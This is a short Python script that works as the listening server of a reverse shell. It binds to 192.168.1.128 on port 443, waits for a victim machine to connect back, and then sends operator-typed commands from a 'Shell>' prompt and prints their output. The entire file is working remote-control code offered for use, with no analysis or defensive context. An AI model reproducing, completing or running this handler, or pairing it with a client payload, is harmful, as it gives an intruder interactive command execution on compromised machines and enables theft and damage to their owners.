#!/usr/bin/env python3

import sys
import socket
import subprocess
import signal
from termcolor import colored

def close_application(sig, frame):
    print(colored("[!] Closing application...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, close_application)

class Server:
    
        def __init__(self, ip, port):
            self.ip = ip
            self.port = port
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # This is to reuse the socket in case of a crash
            self.server_socket.bind((self.ip, self.port))
            self.server_socket.listen()
            print(colored(f"[+] Listening for incoming connections on {self.ip}:{self.port}", "green"))
            self.client_socket, self.client_address = self.server_socket.accept()
            print(colored(f"[+] Connection established with {self.client_address[0]}:{self.client_address[1]}", "green"))
    
        def run_command(self, command):
            self.client_socket.send(command.encode())
            command_output = self.client_socket.recv(2048).decode()
            return command_output
    
        def run(self):
            while True:
                command = input("Shell> ")
                command_output = self.run_command(command)
                print(command_output)
    
        def close(self):
            self.client_socket.close()
            self.server_socket.close()

if __name__ == "__main__":
    server = Server("192.168.1.128", 443)
    server.run()